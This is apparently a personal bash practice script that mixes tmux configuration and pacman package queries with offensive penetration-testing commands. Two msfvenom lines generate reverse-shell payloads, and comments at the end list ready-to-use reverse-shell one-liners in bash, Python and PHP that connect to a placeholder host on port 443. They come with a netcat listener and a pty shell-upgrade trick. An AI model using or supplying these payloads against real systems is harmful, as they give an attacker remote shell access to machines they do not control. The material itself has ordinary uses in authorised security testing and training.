#!/bin/bash

tmux list-command
read -p "> Press any key to continue ..."

tmux set -g prefix Ctrl-b
read -p "> Press any key to continue ..."

tmux set-option -g default-shell /usr/bin/zsh
read -p "> Press any key to continue ..."

pacman -Q -o dig
read -p "> Press any key to continue ..."

pacman -Q -l whois
read -p "> Press any key to continue ..."

msfvenom -p cmd/unix/reverse_python lhost=127.0.0.1 lport=443 -f raw
read -p "> Press any key to continue ..."

msfvenom -p cmd/unix/reverse_bash lhost=127.0.0.1 lport=443 -f raw
read -p "> Press any key to continue ..."

# w! sudo tee %
# nc -lvnp 443
# bash -i >& /dev/tcp/x.x.x.x/443 0>&1
# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
# php -r '$sock=fsockopen("x.x.x.x",443);exec("/bin/bash -i <&3 >&3 2>&3");'
# php -r ‘exec(“/bin/bash -i >& /dev/tcp/x.x.x.x/443”);’

# python -c "import pty;pty.spawn('/bin/bash')"
